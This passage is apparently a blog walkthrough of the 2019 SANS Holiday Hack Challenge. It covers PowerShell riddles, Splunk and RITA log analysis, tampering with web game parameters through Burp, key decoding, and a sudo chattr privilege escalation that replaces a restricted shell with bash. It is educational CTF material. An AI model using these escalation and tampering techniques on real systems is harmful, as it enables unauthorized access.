There&#8217;s a calibration settings in the history, along with the next riddle, at position number 9. To inspect it further, use &#8220;Get-History -ID&#8221; and &#8220;Format-List -Property&#8221; to show everything about that entry.

#### Riddle 2 &#8211; Environment

```
PS /home/elf> Get-History -ID 9 | Format-List -Property *

Id                 : 9
CommandLine        : I have many name=value variables that I share to applications system wide. 
                     At a command I will reveal my secrets once you Get my Child Items.
ExecutionStatus    : Completed
StartExecutionTime : 11/29/19 4:57:16 PM
EndExecutionTime   : 11/29/19 4:57:16 PM
Duration           : 00:00:00.6090308
```

The riddle mentions name=value variables, and that is referring to environment variables. To see them, use the command `Get-ChildItems env:` and it requires the colon at the end.

```
PS /home/elf> Get-ChildItem env:

Name                           Value
----                           -----
_                              /bin/su
DOTNET_SYSTEM_GLOBALIZATION_I… false
HOME                           /home/elf
HOSTNAME                       040650f40b8e
LANG                           en_US.UTF-8
LC_ALL                         en_US.UTF-8
LOGNAME                        elf
MAIL                           /var/mail/elf
PATH                           /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/s…
PSModuleAnalysisCachePath      /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnaly…
PSModulePath                   /home/elf/.local/share/powershell/Modules:/usr/local/share/powers…
PWD                            /home/elf
RESOURCE_ID                    79d5b2ca-1002-4fa7-9d84-dd93e1585089
riddle                         Squeezed and compressed I am hidden away. Expand me from my priso…
SHELL                          /home/elf/elf
SHLVL                          1
TERM                           xterm
USER                           elf
USERDOMAIN                     laserterminal
userdomain                     laserterminal
username                       elf
USERNAME                       elf
```

The next riddle is the &#8220;riddle&#8221; variable. Use the command `Get-Content env:riddle` to see the whole thing.

#### Riddle 3 &#8211; Recurse /etc/

```
PS /home/elf> Get-Content env:riddle
Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.
```

The riddle tells us to go through all the files and folders of /etc and find the newest file. Use the command `cd /etc; Get-ChildItem -Recurse | Sort-Object -Property LastWriteTime`. That will change to the /etc directory, then get all the files and folders with `Get-ChildItem`, then it sorts them based on the property `LastWriteTime`.

It will show five files that have a newer date than the rest.

```
Directory: /etc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          12/13/19  5:16 PM            575 group-
------          12/13/19  5:16 PM            476 gshadow-
--r---          12/13/19  5:16 PM            581 group
------          12/13/19  5:16 PM            482 gshadow
-----l           1/10/20  9:47 PM             12 mtab
--r---           1/10/20  9:47 PM            174 hosts
--r---           1/10/20  9:47 PM            113 resolv.conf
--r---           1/10/20  9:47 PM             13 hostname

    Directory: /etc/apt

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---           1/10/20  9:47 PM        5662902 archive
```

The most interesting one is &#8220;archive&#8221;. To see what&#8217;s inside, use the command `Expand-Archive -Path apt/archive -DestinationPath '/home/elf/archive/'`. Then go back to the home directory and look at the archive folder.

```
PS /etc> cd /home/elf; Get-ChildItem archive


    Directory: /home/elf/archive

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----           1/10/20  9:53 PM                refraction
```

There&#8217;s another folder called &#8216;refraction&#8217;. Go to that directory and use Get-ChildItem to list its contents.

```
PS /home/elf> cd archive/refraction
PS /home/elf/archive/refraction> Get-ChildItem


    Directory: /home/elf/archive/refraction

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------           11/7/19 11:57 AM            134 riddle
------           11/5/19  2:26 PM        5724384 runme.elf
```

The &#8220;runme.elf&#8221; file is clearly a binary file if you try to get it&#8217;s contents, so to run it you have to change it&#8217;s mode properties. You can actually use a few standard bash shell commands here, and &#8220;chmod&#8221; is one of them.

```
PS /home/elf/archive/refraction> chmod +x runme.elf
PS /home/elf/archive/refraction> ./runme.elf       
refraction?val=1.867
```

That program prints out another one of the laser values. The other file in that directory is the next riddle.

#### Riddle 4 &#8211; md5 Hash Search

```
PS /home/elf/archive/refraction> Get-Content riddle
Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:

25520151A320B5B0D21561F92C8F6224
```

Following clues in this riddle, look at all the files and directories within /home/elf.

```
PS /home/elf/archive/refraction> cd 
PS /home/elf> Get-ChildItem


    Directory: /home/elf

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----           1/11/20  3:28 AM                archive
d-r---          12/13/19  5:15 PM                depths
--r---          12/13/19  4:29 PM           2029 motd
```

The &#8220;depths&#8221; directory matches clues in the riddle, so search in there for a file with the md5 hash of &#8220;25520151A320B5B0D21561F92C8F6224&#8221;. To do so will require a couple lines of commands. You can use shortcuts for common PowerShell cmdlets such as &#8220;gci&#8221; for &#8220;Get-ChildItem&#8221;.

```
PS /home/elf> gci -File -Recurse -Depth 2 -Path 'depths' | Get-FileHash -Algorith MD5 | Format-List > out.txt 
PS /home/elf> gc out.txt | Select-String -Pattern "25520151A320B5B0D21561F92C8F6224" -SimpleMatch -Context 1,1

  Algorithm : MD5
> Hash      : 25520151A320B5B0D21561F92C8F6224
  Path      : /home/elf/depths/produce/thhy5hll.txt
  ```

The discovered file gives you another laser parameter value and the next riddle.

#### Riddle 5 &#8211; Deepest Directory

```
PS /home/elf> gc /home/elf/depths/produce/thhy5hll.txt
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
```

The PowerShell code to solve this riddle&#8217;s clue is kind of complex:  
First recursively list out directory contents of &#8220;depths&#8221;.  
Second, Select the objects&#8217; full pathname and calculate the length of the paths.  
Third, sort against the calculated length and display the output.

```
PS /home/elf> gci "./*" -File -Recurse -Path "depths" | select-object FullName, @{Name="Nlength";Expression={$_.FullName.Length}} | sort-object Nlength | Format-List
...
FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/v
           ote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefo
           re/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end
           /accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/
           accident/labor/sail/dropped/fox/0jhj5xz6.txt
Nlength  : 388
```

Dump the contents of the file to see the next riddle.

#### Riddle 6 &#8211; Kill their Jobs

```
PS /home/elf> gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:

bushy
alabaster
minty
holly

Do this for me and then you /shall/see .
```

In this riddle, you have to list processes by owner and kill those in a certain order.  
First, use the command `Get-Process -IncludeUserName` to list those jobs.  
Second, use `Stop-Process -ID -Force` to kill processes by their ID.  
If you kill the processes in the correct order, you will get the next riddle in a file called `/home/elf/shall/see`

#### Riddle 7 &#8211; Event Log ID&#8217;s

```
PS /home/elf> Get-Content /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will 
be in the Properties of the lonely unique event Id.
```

This riddle wants you to parse through an EventLog and group events by Id. The solution will involve the event that is in its own group. 

To solve this riddle, first, find the XML file in &#8220;/etc&#8221; using the command `Get-ChildItem -Recurse -Path "/etc/" -Include "*.xml"`.  
Second, change to the directory of the file that was found to make the rest easier, `cd /etc/systemd/system/timers.target.wants/`.  
Third, use `Select-String -Path ./EventLog.xml -Pattern ‘N=”Id”>(.*)<‘ -AllMatches` to parse the event log for matches to the specified regular expression. That will collect all the event id&#8217;s since they begin with &#8216;<I32 N=&#8221;Id&#8221;>&#8217; tag. To verify that you can dump the contents of EventLog.xml and look for some of the described tags. Pipe the matches into a &#8220;Group-Object&#8221; command by their value, using `| % {$_.matches.groups[1].value} | Group-Object`.

```
PS /etc/systemd/system/timers.target.wants> Select-String -Path ./EventLog.xml -Pattern 'N="Id">(.*)<' -AllMatches | % {$_.matches.groups[1].value} | Group-Object

Count Name                      Group
----- ----                      -----
    1 1                         {1}
   39 2                         {2, 2, 2, 2…}
  179 3                         {3, 3, 3, 3…}
    2 4                         {4, 4}
  905 5                         {5, 5, 5, 5…}
   98 6                         {6, 6, 6, 6…}
```

The EventID that is all alone is &#8220;1&#8221;. Search for it in the file with a command like `Select-String -Path ./EventLog.xml -Pattern ‘N=”id”>1<‘ -Context 8,200` and look for soemthing interesting in its Properties. You should find the last laser parameter needed.

#### Parameters

First, get information about the API using the command included in the bannertext of the terminal challenge. It shows how to set the variables needed to calibrate the laser.

```
PS /home/elf> (Invoke-WebRequest -Uri http://localhost:1225/).RawContent
HTTP/1.0 200 OK                                                                                   
Server: Werkzeug/0.16.0                                                                           
Server: Python/3.6.9                                                                              
Date: Sat, 11 Jan 2020 05:09:18 GMT                                                               
Content-Type: text/html; charset=utf-8
Content-Length: 860

<html>
<body>
<pre>
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off

Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output

Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0

Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10

Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1

Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
----------------------------------------------------
</pre>
</body>
</html>
```

##### Parameter Angle:  
Found in Riddle 1  
Command is (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent

##### Parameter Refraction:  
Found in Riddle 3  
refraction?val=1.867  
Command is (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContent 

##### Parameter Temperature:  
Found in Riddle 4  
temperature?val=-33.5  
Command is (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContent 

##### Parameter Gases:  
Found in Riddle 7  
powershell.exe -c "\`$correct\_gases\_postbody = @{
O=6
H=7
He=3
N=4
Ne=22
Ar=11
Xe=10
F=20
Kr=8
Rn=9}"
Command is `(Invoke-WebRequest -Uri “http://127.0.0.1:1225/api/gas?val=65.5” -Method POST -Body “O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9”).RawContent`

After inputting those API commands, check the output with &#8220;/api/output&#8221; to complete the challenge.

```
PS /home/elf> (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent        
HTTP/1.0 200 OK                                                                                   
Server: Werkzeug/0.16.0                                                                           
Server: Python/3.6.9                                                                              
Date: Sat, 11 Jan 2020 05:25:25 GMT                                                               
Content-Type: text/html; charset=utf-8
Content-Length: 200

Success! - 6.76 Mega-Jollies of Laser Output Reached!
```

The hint that Sparkle Redberry gives after completing the challenge is:

<blockquote class="wp-block-quote">
  <p>
    You got it &#8211; three cheers for cheer!<br />For objective 5, have you taken a look at our Zeek logs? <br />Something&#8217;s gone wrong. But I hear someone named Rita can help us. <br />Can you and she figure out what happened?
  </p>
  
  <cite>Sparkle Redberry</cite>
</blockquote>

### Solution

The hint refers to the analysis software RITA. It didn&#8217;t install on my Kali box for some reason, so I downloaded a virtual machine for Blue Team operations called &#8220;SecurityOnion&#8221;, where RITA comes installed. After much struggling trying to get RITA to complete the analysis I finally figured out that in the &#8220;elfu-zeeklogs&#8221; download, there was a pre-generated RITA report!! What a waste of time getting it to run the analysis myself, probably a whole day&#8217;s worth. 

If you go to &#8220;elfu-zeeklogs/ELFU/index.html&#8221; you&#8217;ll see the report. Pretty much the only thing that&#8217;s useful is the &#8220;Beacons&#8221; tab found at the top. Suspicious connections have high counts and should be at the top of the list.

Since the Objective is to find the IP address of the malware-infected system, get the source address for the top result and submit it as the answer.

You can now speak to Santa again and get more dialogue to unlock more Objectives.

<blockquote class="wp-block-quote">
  <p>
    Thank you for finding Jane and Michael, our two turtle doves!<br />I’ve got an uneasy feeling about how they disappeared.<br />Turtle doves wouldn’t wander off like that.<br />Someone must have stolen them! Please help us find the thief!<br />It’s a moral imperative!<br />I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!<br />Gosh, I can’t help but think:<br />Winds in the East, snow coming in…<br />Like something is brewing and about to begin!<br />Can’t put my finger on what lies in store,<br />But I fear what’s to happen all happened before!
  </p>
  
  <cite>Santa</cite>
</blockquote>

## Objective 6 &#8211; Splunk

> Access&nbsp;<https://splunk.elfu.org/>&nbsp;as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along!&nbsp;_For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: &#8220;Kent you are so unfair. And we were going to make you the king of the Winter Carnival.&#8221;
  </p>
</blockquote>

This Objective is all about analyzing event log data with a Splunk App the ElfU SOC made. The Objective text directs you to Professor Banas for a hint but he really doesn&#8217;t give you any. He just ties in the storyline to visit the Splunk App.

<blockquote class="wp-block-quote">
  <p>
    Hi, I&#8217;m Dr. Banas, professor of Cheerology at Elf University.<br />This term, I&#8217;m teaching &#8220;HOL 404: The Search for Holiday Cheer in Popular Culture,&#8221; and I&#8217;ve had quite a shock!<br />I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC.<br />Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP!<br />If I don&#8217;t, he will have to report the incident to the boss of the SOC.<br />Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks.<br />I don&#8217;t know anything about computer security. Can you please help me?
  </p>
  
  <cite>Professor Banas</cite>
</blockquote>

When you visit the Splunk site given, you&#8217;ll see a chat app with several elf members of the ELFU Security Operations Center. Since Prof Banas said to talk to Kent, click on his name on the left and see what chat text is available. Ultimately, the goal of the Splunk Objective is to find the message left for Kent in the event log.

[<img src="/assets/img/2020/01/image-8-1024x941.png" />](/assets/img/2020/01/image-8.png)

If you go through the chats that are available, you&#8217;ll get to talk to Alice Bluebird, who guides you through completing the training questions to the right side of the screen. By the time you finish the training questions you should be able to use what you&#8217;ve learned to figure out what the message for Kent is. Use the Search tab at the top of the page to analyze the event log data to get the answers.

### Training Question 1

What is the short host name of Professor Banas&#8217; computer?

#### Answer &#8211; **sweetums**

This is found in the chat with #ELFU SOC.

### Training Question 2

What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\temp\report.pdf)

#### Answer &#8211; C:\Users\cbanas\Documents\Naughty\_and\_Nice\_2019\_draft.txt

This is found by searching for &#8220;Santa&#8221;

### Training Question 3

What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)

#### Answer &#8211; 144.202.46.214.vultr.com

To find the answer, search:

```
sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 powershell
```

Then look at the Interesting Field &#8220;dest_host&#8221; on the left of the page.

### Training Question 4

What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)

#### Answer &#8211; 19th Century Holiday Cheer Assignment.docm

Follow Alice Bluebird&#8217;s instructions by first searching for:

```
index=main sourcetype="WinEventLog:Microsoft-Windows-Powershell/Operational" | reverse
```

Then follow her instructions to pivot on time:

<blockquote class="wp-block-quote">
  <p>
    Look at the&nbsp;<strong>Time</strong>&nbsp;column in your search results. If you click on the date/timestamp from that first event, you can specify a time window. Accept the default of +/- five seconds and click apply. Then remove the&nbsp;<strong>sourcetype</strong>&nbsp;search term and also remove the &#8216;<strong>| reverse</strong>&#8216; and re-run the search.
  </p>
</blockquote>

Instead of 5 seconds, select a time window of 1 minute and look at all the events. Alice Bluebird will tell you to search for Process ID&#8217;s, but I couldn&#8217;t find anything using that method. In the area where &#8220;interesting fields&#8221; are displayed, click &#8220;All Fields&#8221; and look at the field &#8220;Process\_Command\_Line&#8221;. You&#8217;ll see several commands, and one of them inclues a document that is loaded by Microsoft Word, that is the answer.

### Training Question 5

How many unique email addresses were used to send Holiday Cheer essays to Professor Banas? Please provide the numeric value. (Example: 1)

#### Answer &#8211; 21

First, search on &#8220;Holiday Cheer&#8221;, making sure you&#8217;re looking at the entire time range.  
Then look at the &#8220;results{}.workers.smtp.subject&#8221; field that&#8217;s associated with emails.  
There are 21 emails that are related to the &#8220;Holiday Cheer Assignment Submission&#8221;

[<img src="/assets/img/2020/01/image-9-1024x940.png" />](/assets/img/2020/01/image-9.png)

### Training Question 6

What was the password for the zip archive that contained the suspicious file?

#### Answer &#8211; 123456789

Search for the suspicious filename, which is &#8220;19th Century Holiday Cheer Assignment.docm&#8221;.  
Then go to the stoq event and open the dropdown pluses for the first result -> workers -> smtp.  
There you&#8217;ll see the email body which contains the password.

[<img src="/assets/img/2020/01/image-10-1024x940.png" />](/assets/img/2020/01/image-10.png)

### Training Question 7

What email address did the suspicious file come from?

#### Answer &#8211; Bradly.Buttercups@eIfu.org

Using the same event from the previous question, look at the &#8220;from&#8221; field. Notice the from address domain is &#8220;eIfu.org&#8221; using a capital &#8220;i&#8221;.

### Challenge Question

What was the message for Kent that the adversary embedded in this attack?

Alice Bluebird provides you with link to the event you need to look through and a link to the file archive. To solve the challenge question you have to search through the &#8220;results&#8221; for any suspicious files and open them from the file archive. It is best to craft an spath command and Alice gives an example of what that looks like.

Here is the spath command that will show a list of all the files involved with the event. You can open them up one by one by copying the path and pasting in the address bar of the file archive.

[<img src="/assets/img/2020/01/image-11-1024x150.png" />](/assets/img/2020/01/image-11.png)

After traveling to the file path, you will have to go up a directory or two until you&#8217;re able to see the file download link. After downloading the file you want, just open it in a text editor to see if you have something interesting. The file with the answer is &#8220;core.xml&#8221;.

## Objective 7 &#8211; Get Access to the Steam Tunnels

> Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name.&nbsp;_For hints on achieving this objective, please visit Minty&#8217;s dorm room and talk with Minty Candy Cane.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: Krampus Hollyfeld
  </p>
</blockquote>

This Objective requires some exploration. You&#8217;ll have to get into the locked closet inside of Minty Candycane&#8217;s dorm room.

### Dorm PinPad

The first thing to do is get access to the Dorm area by cracking the pinpad code that&#8217;s at the right hand side of the Quad.

You can get a hint from the elf near it, Tangle Coalbox. He says:

<blockquote class="wp-block-quote">
  <p>
    Hey kid, it&#8217;s me, Tangle Coalbox.<br />I&#8217;m sleuthing again, and I could use your help.<br />Ya see, this here number lock&#8217;s been popped by someone.<br />I think I know who, but it&#8217;d sure be great if you could open this up for me.<br />I&#8217;ve got a few clues for you.<br />1. One digit is repeated once.<br />2. The code is a prime number.<br />3. You can probably tell by looking at the keypad which buttons are used.
  </p>
  
  <cite>Tangle Coalbox</cite>
</blockquote>

On the keypad, you can see three numbers that are used because there is less frost on them.

[<img src="/assets/img/2020/01/image-13.png" />](/assets/img/2020/01/image-13.png)

Tangle said one of the numbers is repeated, and the code is a prime number.

After a few tries you should be able to crack it.

<blockquote class="wp-block-quote">
  <p>
    Answer &#8211; 7331
  </p>
</blockquote>

### Terminal Challenge &#8211; Holiday Hack Trail

Minty Candycane gives a hint to get into the closet in her room, but first you have to hack the game in her terminal challenge.

The tool I prefer for this job is BurpSuite, but you could use another HTTP filter proxy or browser addon that can modify headers and data.

Start the game and play around to see how it works, while watching the requests in Burp. 

#### Easy Mode

To solve Easy Mode, you can modify variables in the url at the top of the game screen after you&#8217;re out of the store. One way to do it is modify &#8220;distance&#8221; to 8000 then press &#8220;GO&#8221;.

<img src="/assets/img/2020/01/image-14.png" />

#### Medium Mode

In the Medium Mode, all of the variables were moved from the URL into POST data, which you can see in Burp. Use the Repeater tab to modify a variable, then press Send.

[<img src="/assets/img/2020/01/image-16-1024x803.png" />](/assets/img/2020/01/image-16.png)

#### Hard Mode

In the POST variables on Hard mode, there is a &#8220;hash&#8221; value that has to be right or the game will give an error.

[<img src="/assets/img/2020/01/image-17-1024x803.png" />](/assets/img/2020/01/image-17.png)

For a strong clue, watch the talk [Web Apps: A Trailhead](http://www.youtube.com/watch?v=0T6-DQtzCgM). The algorithm is leaked about mid-way through the video. Not everything is seen perfectly, but you can sort out that the hash is adding the numeric values of variables together in a string and running &#8220;md5it&#8221; to get it&#8217;s md5 hash value. To find out exactly which variables are being put together simply change values and see which ones cause errors. 

[<img src="/assets/img/2020/01/image-18-1024x578.png" />](/assets/img/2020/01/image-18.png)

The variables used are:  
money  
distance  
curday  
curmonth  
reindeer  
runners  
ammo  
meds  
food

Add the values together that you want to send and use an online MD5 generator to get the hash value.

[<img src="/assets/img/2020/01/image-19-1024x803.png" />](/assets/img/2020/01/image-19.png)

### Hint

<blockquote class="wp-block-quote">
  <p>
    You made it &#8211; congrats!<br />Have you played with the key grinder in my room? Check it out!<br />It turns out: if you have a good image of a key, you can physically copy it.<br />Maybe you&#8217;ll see someone hopping around with a key here on campus.<br />Sometimes you can find it in the Network tab of the browser console.<br />Deviant has a great talk on it at this year&#8217;s Con.<br />He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.
  </p>
  
  <cite>Minty Candycane</cite>
</blockquote>

The hint Minty gives is regarding a key making machine in her room. And mentions looking for a person with a key by monitoring the Network tab in the browser&#8217;s developer tools.

When you walk into her room, you&#8217;ll see a guy hurry into the closet and shut the door behind him. And if your Network tab is open, it will record the download for his image file. The guy&#8217;s name is Krampus, and the key is very clearly visible.

<img src="/assets/img/2020/01/image-20-463x1024.png" />

In the room, there is a key grinder on the desk that allows you to click on it and make a key. Click the key to download an image of it.

[<img src="/assets/img/2020/01/image-21.png" />](/assets/img/2020/01/image-21.png)

When you go into the closet you see a keyhole on the back wall that you can click on. It will open a closeup view of the lock with a group of keys hanging up. Click on the keys to load your own key image that was saved from the grinder.

[<img src="/assets/img/2020/01/image-22-1024x757.png" />](/assets/img/2020/01/image-22.png)

There is a talk that will help figure out the key&#8217;s biting code called &#8220;[Optical Decoding of Keys](http://www.youtube.com/watch?v=KU6FJnbkeLA)&#8220;. It has some general info about the issue, and after watching that talk you should be able to figure out the code on Krampus&#8217;s key by looking closely at the picture and guessing the values. Then input your guess into the key grinder to save your own copy of the key to use in the secret door. 

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: 122520
  </p>
</blockquote>

### Steam Tunnels

Opening the secret door at the back of the closet goes to the steam tunnels. Walk through the tunnel to the end to meet and talk to Krampus. Here you find out that he was actually the one who took the Turtle Doves!

<blockquote class="wp-block-quote">
  <p>
    Hello there! I’m Krampus Hollyfeld.<br />I maintain the steam tunnels underneath Elf U,<br />Keeping all the elves warm and jolly.<br />Though I spend my time in the tunnels and smoke,<br />In this whole wide world, there&#8217;s no happier bloke!<br />Yes, I borrowed Santa’s turtle doves for just a bit.<br />Someone left some scraps of paper near that fireplace, which is a big fire hazard.<br />I sent the turtle doves to fetch the paper scraps.<br />But, before I can tell you more, I need to know that I can trust you.<br />Tell you what – if you can help me beat the <a href="https://fridosleigh.com/">Frido Sleigh</a> contest (Objective 8), then I&#8217;ll know I can trust you.<br />The contest is here on my screen and at <a href="https://fridosleigh.com/">fridosleigh.com</a>.<br />No purchase necessary, enter as often as you want, so I am!<br />They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.<br />Unfortunately, it&#8217;s restricted to elves only, and I can&#8217;t bypass the CAPTEHA.<br />(That&#8217;s Completely Automated Public Turing test to tell Elves and Humans Apart.)<br />I&#8217;ve already cataloged <a href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a> and decoded the <a href="https://downloads.elfu.org/capteha_api.py">API interface</a>.<br />Can you help me bypass the CAPTEHA and submit lots of entries?
  </p>
  
  <cite>Krampus Hollyfeld</cite>
</blockquote>

Solving this Objective unlocks the rest of the Objectives, and you&#8217;ll get a new tab to your badge that allows you to fast travel through the steam tunnels.

[<img src="/assets/img/2020/01/image-23.png" />](/assets/img/2020/01/image-23.png)

## Objective 8 &#8211; Bypassing the Frido Sleigh CAPTEHA

> Help Krampus beat the&nbsp;[Frido Sleigh contest](https://fridosleigh.com/).&nbsp;_For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.

<blockquote class="wp-block-quote is-style-large">
  <p>
    Answer: 8Ia8LiZEwvyZr2WO
  </p>
</blockquote>

This Objective was given by Krampus to help him win the [Frido Sleigh](https://fridosleigh.com/) competition by circumventing the custom captcha system called CAPTEHA ( Completely Automated Public Turing test to tell Elves and Humans Apart). Krampus provides some code to start with that uses an [API interface](https://downloads.elfu.org/capteha_api.py) to the competition. He also provides [12,000 images](https://downloads.elfu.org/capteha_images.tar.gz) he&#8217;s saved to use with a machine learning algorithm for the solution.

[<img src="/assets/img/2020/01/image-24.png" />](/assets/img/2020/01/image-24.png)

When you fill in the info fields and check the CAPTEHA box it presents the challenge image and gives you only 5 seconds to complete it or else it determines you&#8217;re not an elf and exits.

[<img src="/assets/img/2020/01/image-25-1024x940.png" />](/assets/img/2020/01/image-25.png)

To inspect this screen a little closer, you can use the Developer Tools Console in your browser, and enter this code to change the timeout value:

```
$('#timer').text('9000')
```

Even with the timer set to something ridiculous, you can select all the proper images, but still not be able to pass the challenge.

To get a hint on how to use machine learning to break the CAPTEHA, talk to Alabaster Snowball in the Speaker Unpreparedness Room, which is in the Hermey Hall area of campus.

### Terminal Challenge &#8211; Nyanshell

<blockquote class="wp-block-quote">
  <p>
    Welcome to the Speaker UNpreparedness Room!<br />My name&#8217;s Alabaster Snowball and I could use a hand.<br />I&#8217;m trying to log into this terminal, but something&#8217;s gone horribly wrong.<br />Every time I try to log in, I get accosted with … a hatted cat and a toaster pastry?<br />I thought my shell was Bash, not flying feline.<br />When I try to overwrite it with something else, I get permission errors.<br />Have you heard any chatter about immutable files? And what is sudo -l telling me?
  </p>
  
  <cite>Alabaster Snowball</cite>
</blockquote>

Help Alabaster break out of the limited shell in the terminal challenge. The banner text says to log into a bash shell as &#8220;alabaster_snowball&#8221;. 

When trying to use the command &#8220;su&#8221; to get into alabaster&#8217;s account, you will be greated with a holiday nyancat!

[<img src="/assets/img/2020/01/image-26.png" />](/assets/img/2020/01/image-26.png)

Dumping &#8220;/etc/passwd&#8221; shows that alabaster&#8217;s shell is set to &#8220;/bin/nsh&#8221;.

```
elf@2e974b2f04ac:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/bash
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
```

If you try to use &#8220;chsh&#8221; to change alabaster&#8217;s shell the normal way if fails for some reason. So we have to replace &#8220;nsh&#8221; with &#8220;bash&#8221; to get the right shell in place.

Alabaster gives a hint about immutable files when talking to him, and &#8220;nsh&#8221; is indeed one of them. To verify, use the command `lsattr /bin/nsh`. However, upon Alabaster&#8217;s other hint about `sudo -l`, you&#8217;ll see that you have access to `chattr`.

```
elf@2e974b2f04ac:~$ sudo -l
Matching Defaults entries for elf on 2e974b2f04ac:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elf may run the following commands on 2e974b2f04ac:
    (root) NOPASSWD: /usr/bin/chattr
```

Use `chattr` to modify `nsh`, and then copy bash into it.

```
sudo chattr -i /bin/nsh; cp /bin/bash /bin/nsh
```

Use `su` to log in as alabaster_snowball and you&#8217;ll beat the challenge.

### Hint

<blockquote class="wp-block-quote is-style-default">
  <p>
    Who would do such a thing?? Well, it IS a good looking cat.<br /> Have you heard about the Frido Sleigh contest?<br /> There are some serious prizes up for grabs.<br /> The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter.<br /> I heard there was a talk at KCII about using machine learning to defeat challenges like this.<br /> I don&#8217;t think anything could ever beat an elf though!
  </p>
  
  <cite>Alabaster Snowball</cite>
</blockquote>

You&#8217;ll get a Hint in your badge from Alabaster called &#8220;Machine Learning&#8221; that gives a link to a talk [Machine Learning Use Cases for Cyber Security](https://youtu.be/jmVPLwjm_zs) In the video you&#8217;ll see the URL to some [demo code](https://github.com/chrisjd20/img_rec_tf_ml_demo) to that helps to use ML with TensorFlow. It provides a script that trains a model with given images and also code to run against the model.

### Solution

